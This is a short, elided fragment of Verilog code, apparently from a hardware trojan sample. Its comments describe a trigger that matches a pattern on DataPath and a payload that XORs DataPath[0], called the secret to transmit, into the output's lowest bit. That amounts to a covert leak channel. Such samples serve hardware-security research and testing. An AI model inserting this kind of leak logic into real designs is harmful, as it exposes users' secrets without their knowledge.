 ...
 *   depending on whether DataPath matches the pattern.
 *
 ...
 * Payload: XOR DataPath[0] into observable output
 *
...
wire secret_bit;
assign secret_bit = DataPath[0];  // LSB is the secret to transmit
...
//   Output LSB = normal_LSB XOR DataPath[0]
